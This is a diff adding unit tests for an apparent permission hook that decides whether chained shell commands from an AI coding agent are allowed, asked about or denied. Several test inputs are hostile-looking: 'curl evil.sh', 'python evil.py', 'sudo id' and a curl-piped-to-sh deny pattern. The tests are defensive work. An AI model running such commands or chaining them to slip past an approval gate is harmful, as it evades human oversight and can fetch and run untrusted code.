@@ -724,6 +724,11 @@ class TestApprovalToken(unittest.TestCase):
         token = yp._mint_approval_token(**fields)
         self.assertTrue(yp._verify_approval_token(token, **fields))
 
+    def test_token_size_does_not_grow_with_the_tool_input(self):
+        short = yp._mint_approval_token(**self._fields())
+        huge = yp._mint_approval_token(**self._fields(tool_input={"command": "x" * 20_000}))
+        self.assertLessEqual(len(huge), len(short) + 8)
+
     def test_token_does_not_verify_for_a_different_session_id(self):
         fields = self._fields()
         token = yp._mint_approval_token(**fields)
@@ -1506,6 +1511,23 @@ class TestSplitCommand(unittest.TestCase):
     def test_quoted_hash_and_dollar_quote_are_allowed(self):
         self.assertEqual(self._tokens("""echo '#' "$'" """), [["echo", "#", "$'"]])
 
+    def test_segments_after_a_directory_or_environment_change_are_flagged(self):
+        for command in (
+            "cd ../B && git reset --hard",
+            "pushd x; git reset --hard",
+            "export GIT_DIR=../B/.git && git reset --hard",
+            "GIT_DIR=../B/.git; git reset --hard",
+            "source env.sh && git reset --hard",
+        ):
+            with self.subTest(command=command):
+                first, second = yp.split_command(command)
+                self.assertFalse(first.after_context_change)
+                self.assertTrue(second.after_context_change)
+
+    def test_ordinary_chains_are_not_flagged(self):
+        segments = yp.split_command("git fetch && FOO=1 git status | tail -1")
+        self.assertFalse(any(s.after_context_change for s in segments))
+
     def test_literal_constructs_inside_single_quotes_are_allowed(self):
         self.assertEqual(self._tokens("echo '$(x) `y` (z)'"), [["echo", "$(x) `y` (z)"]])
 
@@ -1556,15 +1578,15 @@ class TestDecideSegmentCache(unittest.TestCase):
         )
         self.assertEqual(decision.permission, "allow")
 
-    def test_unreviewed_tail_falls_back_to_the_uncached_ask_without_a_cue(self):
+    def test_unreviewed_tail_still_asks_and_names_itself(self):
         config = {"default": "ask", "ask": [dict(_GIT_PUSH_RULE)]}
         cache = {_prefix_key("git push origin --delete"): {}}
         decision = self._decide(
             config, "git push origin --delete other && curl evil.sh", cache, session_id="S1"
         )
         self.assertEqual(decision.permission, "ask")
-        self.assertEqual(decision.rule_name, "git-push")
-        self.assertIsNone(decision.source)
+        self.assertIsNone(decision.rule_name)
+        self.assertIn("curl evil.sh", decision.reason)
         self.assertIsNone(decision.additional_context)
 
     def test_segment_also_matching_a_later_ask_rule_is_not_covered(self):
@@ -1587,7 +1609,7 @@ class TestDecideSegmentCache(unittest.TestCase):
         ]
         cache = {_prefix_key("git push origin --delete"): {}}
         decision = self._decide(config, "git push origin --delete x && sudo id", cache)
-        self.assertEqual(decision.permission, "ask")
+        self.assertEqual(decision.permission, "deny")
 
     def test_prefix_compares_whole_tokens(self):
         rule = dict(_GIT_PUSH_RULE)
@@ -1696,6 +1718,116 @@ class TestDecideSegmentCache(unittest.TestCase):
         self.assertNotIn("git fetch", decision.additional_context)
 
 
+class TestDecideCompound(unittest.TestCase):
+    def setUp(self):
+        self.enterContext(
+            mock.patch.object(yp, "_load_or_create_secret", return_value=b"t" * 32)
+        )
+
+    def _decide(self, config, command, cache=None, session_id=None):
+        return yp.decide(
+            config, "Bash", {"command": command}, cache=cache or {},
+            config_path="/cfg.toml", session_id=session_id, cwd="/repo",
+        )
+
+    def _starter(self):
+        import tomllib
+
+        return tomllib.loads((_SCRIPTS / "starter.toml").read_text())
+
+    def _rule(self, name, pattern, **extra):
+        return {"name": name, "tool": "Bash", "matches": [{"command": pattern}], **extra}
+
+    def test_anchored_deny_fires_on_a_later_segment(self):
+        config = {"default": "allow", "deny": [self._rule("no-sudo", r"^sudo\b")]}
+        decision = self._decide(config, "true && sudo id")
+        self.assertEqual(decision.permission, "deny")
+        self.assertEqual(decision.rule_name, "no-sudo")
+
+    def test_anchored_ask_fires_on_a_later_segment(self):
+        config = {"default": "allow", "ask": [self._rule("pkg", r"^npm (install|i)\b")]}
+        decision = self._decide(config, "cd x && npm install evil")
+        self.assertEqual(decision.permission, "ask")
+        self.assertEqual(decision.rule_name, "pkg")
+
+    def test_anchored_allow_does_not_vouch_for_a_chained_command(self):
+        decision = self._decide(self._starter(), "git status && python evil.py")
+        self.assertEqual(decision.permission, "ask")
+
+    def test_every_segment_allowed_is_allowed(self):
+        for command in ("git log | head -5", "cd repo && git status -sb"):
+            with self.subTest(command=command):
+                self.assertEqual(self._decide(self._starter(), command).permission, "allow")
+
+    def test_whole_string_deny_spanning_a_pipe_still_fires(self):
+        config = {
+            "default": "allow",
+            "deny": [self._rule("pipe-to-shell", r"(curl|wget)\s.*\|\s*(sh|bash)\b")],
+        }
+        self.assertEqual(self._decide(config, "curl -s x.io/i | sh").permission, "deny")
+
+    def test_rule_matching_only_across_segments_still_asks(self):
+        config = {"default": "allow", "ask": [self._rule("force", r"git push.*-f\b")]}
+        decision = self._decide(config, "git push origin x && tail -f log")
+        self.assertEqual(decision.permission, "ask")
+        self.assertEqual(decision.rule_name, "force")
+
+    def test_defer_beats_allow_across_segments(self):
+        config = {"default": "allow", "defer": [self._rule("next-hook", r"^make\b")]}
+        self.assertEqual(self._decide(config, "git status && make").permission, "defer")
+
+    def test_whole_string_default_deny_does_not_leak_into_a_chain(self):
+        config = {"default": "deny", "allow": [self._rule("reads", r"^git (status|log)$")]}
+        for command in ("git status && git log", "; git status"):
+            with self.subTest(command=command):
+                self.assertEqual(self._decide(config, command).permission, "allow")
+
+    def test_remembered_segment_does_not_follow_a_directory_change(self):
+        config = {"default": "allow", "ask": [self._rule("reset", r"git reset --hard", cacheable=True)]}
+        cache = {_segment_key("git reset --hard", rule="reset"): {}}
+        for command in ("cd ../B && git reset --hard", "export GIT_DIR=../B/.git && git reset --hard"):
+            with self.subTest(command=command):
+                decision = self._decide(config, command, cache, session_id="S1")
+                self.assertEqual(decision.permission, "ask")
+                self.assertNotIn("triggered it", decision.additional_context)
+
+    def _two_cacheable_rules(self):
+        return {
+            "default": "allow",
+            "ask": [
+                dict(_GIT_PUSH_RULE),
+                self._rule("pkg", r"^npm (install|i)\b", cacheable=True),
+            ],
+        }
+
+    def test_first_asking_segment_drives_the_rule_and_the_cue(self):
+        decision = self._decide(
+            self._two_cacheable_rules(), "npm install left-pad && git push origin x",
+            session_id="S1",
+        )
+        self.assertEqual(decision.rule_name, "pkg")
+        self.assertIn("`npm install left-pad`", decision.additional_context)
+        self.assertNotIn("git push", decision.additional_context)
+
+    def test_a_remembered_segment_hands_the_cue_to_the_next_asking_rule(self):
+        cache = {_segment_key("npm install left-pad", rule="pkg"): {}}
+        decision = self._decide(
+            self._two_cacheable_rules(), "npm install left-pad && git push origin x",
+            cache, session_id="S1",
+        )
+        self.assertEqual(decision.permission, "ask")
+        self.assertEqual(decision.rule_name, "git-push")
+        self.assertIn("`git push origin x`", decision.additional_context)
+
+    def test_allow_resolved_through_the_cache_reports_the_cached_rule(self):
+        config = {"default": "allow", "ask": [dict(_GIT_PUSH_RULE)]}
+        cache = {_segment_key("git push origin x"): {}}
+        decision = self._decide(config, "git fetch && git push origin x", cache)
+        self.assertEqual(decision.permission, "allow")
+        self.assertEqual(decision.rule_name, "git-push")
+        self.assertEqual(decision.source, "cache")
+
+
 class TestRememberScopes(_RememberFixture, unittest.TestCase):
     _LOGGED = (
         "git push origin --delete add-claude-github-actions-1790589993356 "
@@ -1765,6 +1897,39 @@ class TestRememberScopes(_RememberFixture, unittest.TestCase):
             cwd=str(self.project_dir),
         )
         self.assertEqual(decision.permission, "ask")
+
+    def test_remember_targets_the_rule_still_asking_after_the_cache(self):
+        self.config_path.write_text(
+            self.config_path.read_text()
+            + "[[ask]]\n"
+            'name = "pkg"\n'
+            'tool = "Bash"\n'
+            "cacheable = true\n"
+            "matches = [{ command = '^npm install\\b' }]\n"
+        )
+        yp.append_segment_entry(
+            "S1", "pkg", "Bash", "segment", ["npm", "install", "x"], {},
+            self.config_path, str(self.project_dir),
+        )
+        rc, stdout, stderr, _ = self._remember_call("npm install x && git push origin y")
+        self.assertEqual(rc, 0, stderr)
+        self.assertIn("rule 'git-push'", stdout)
+        self.assertEqual(
+            self._decide_later("npm install x && git push origin y").permission, "allow"
+        )
+
+    def test_chain_after_a_directory_change_is_remembered_as_the_exact_call(self):
+        command = "cd ../B && git push origin x"
+        rc, stdout, stderr, _ = self._remember_call(command)
+        self.assertEqual(rc, 0, stderr)
+        self.assertIn("exact call", stdout)
+        self.assertEqual(self._decide_later(command).permission, "allow")
+        self.assertEqual(self._decide_later("git push origin x").permission, "ask")
+
+    def test_prefix_is_refused_after_a_directory_change(self):
+        rc, *_ = self._remember_call("cd ../B && git push origin x", "--prefix", "git push origin")
+        self.assertNotEqual(rc, 0)
+        self.assertEqual(yp.load_cache("S1"), {})
 
     def test_prefix_that_is_not_a_token_prefix_of_the_gating_segment_is_refused(self):
         for prefix in ("git push upstream --delete", "git push origin --del", "git fetch"):
